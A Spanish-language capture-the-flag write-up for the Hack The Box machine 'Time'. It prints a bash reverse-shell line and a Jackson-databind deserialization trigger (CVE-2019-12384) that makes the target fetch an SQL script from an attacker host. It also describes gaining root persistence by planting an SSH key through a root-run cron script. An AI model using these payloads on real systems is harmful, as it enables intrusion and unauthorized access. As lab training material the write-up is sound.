---
layout: post
title: Resolución de Time (WriteUp)
published: false
categories: WriteUp
---

Time es una máquina Linux de Hack The Box cuya dificultad es “Medium”. Las instrucciones que se utilizan en esta resolución tienen en cuenta que estamos trabajando en un entorno controlado. 

![Time 01]({{ site.baseurl }}/images/timehtb01.png)

### Resolución de Time (user.txt)

En primer lugar enumeramos los puertos abiertos:

![Time 02]({{ site.baseurl }}/images/timehtb02.png)

Para posteriormente realizar un análisis, a través de nmap, de los servicios disponibles en dichos puertos:

![Time 03]({{ site.baseurl }}/images/timehtb03.png)

A través del servicio web disponible en el puerto 80 revisamos el código fuente y realizamos una enumeración en busca de rutas de interés:

![Time 04]({{ site.baseurl }}/images/timehtb04.png)

Pero no hay nada interesante en este aspecto. 

Entramos en la web y vemos que tiene un adaptador y validador de JSON, indicando que el “Validator” está en fase Beta. Lo probamos y este devuelve un error desde el cual podemos obtener más información de la herramienta utilizada:

![Time 05]({{ site.baseurl }}/images/timehtb05.png)

Buscamos vulnerabilidades relacionadas con Fasterxml Jackson: [https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-42991/Fasterxml-Jackson-databind.html](https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-42991/Fasterxml-Jackson-databind.html)

Nos quedamos con la vulnerabilidad [CVE-2019-12384](https://www.cvedetails.com/cve/CVE-2019-12384/) y buscamos información sobre su explotación, encontrando la siguiente forma de explotación que utilizaremos de base para poner en práctica: [https://github.com/jas502n/CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384)

En el fichero inject.sql editamos la llamada a la shell para introducir nuestra propia shell como una ejecución inliner de bash. 
```sql
CALL SHELLEXEC(‘bash -i >& /dev/tcp/IP/PUERTO 0>&1’)
```

Este código, inject.sql, se encargará de establecer la conexión desde la víctima hacia nuestra máquina. Ahora debemos accionarlo. Para ello vamos a montar un servidor con SimpleHTTPServer de Python en local a través del puerto 8181 (por ejemplo) donde estará disponible el inject.sql.

Luego prepararemos un trigger que ejecute el script disponible en este servidor, de la siguiente forma como se indica en el GitHub explicando la vulnerabilidad:

```ruby
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://IP_ATACANTE:8181/inject.sql'"}]"
```

Nos ponemos a la escucha en nuestra máquina a través del puerto definido en inject.sql y, con el servidor activo y el puerto en escucha introducimos el trigger en la web:

![Time 06]({{ site.baseurl }}/images/timehtb06.png)

De esta forma ya tenemos acceso a la máquina víctima con el usuario pericles, pudiendo acceder a la primera flag.

### Resolución de Time (root.txt)

El análisis para buscar la escalada de privilegios en Linux podemos automatizarlo con scripts como [LinEnum](https://github.com/rebootuser/LinEnum) o [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), en este caso haciendo uso de LinPEAS vemos que nos devuelve una información aparentemente muy interesante sobre un script llamado timer_backup.sh:

![Time 07]({{ site.baseurl }}/images/timehtb07.png)

El script crea un zip desde /var/www/html y lo mueve a root:

![Time 08]({{ site.baseurl }}/images/timehtb08.png)

Como este script se ejecuta como root la idea será introducir un comando que agregue nuestra clave pública al authorized_keys de root para poder conectarnos por SSH. 

Para ello, creamos en el servidor un fichero con nuestra clave pública (key.txt) e introducimos al final del script un comando con el que leer nuestra clave pública del fichero key.txt y la inserte al final del fichero authorized_keys:

![Time 09]({{ site.baseurl }}/images/timehtb09.png)

Y utilizando la clave privada asociada a dicha clave pública ya podríamos acceder como root al servidor a través de SSH para visualizar la flag de root.txt:

![Time 10]({{ site.baseurl }}/images/timehtb10.png)
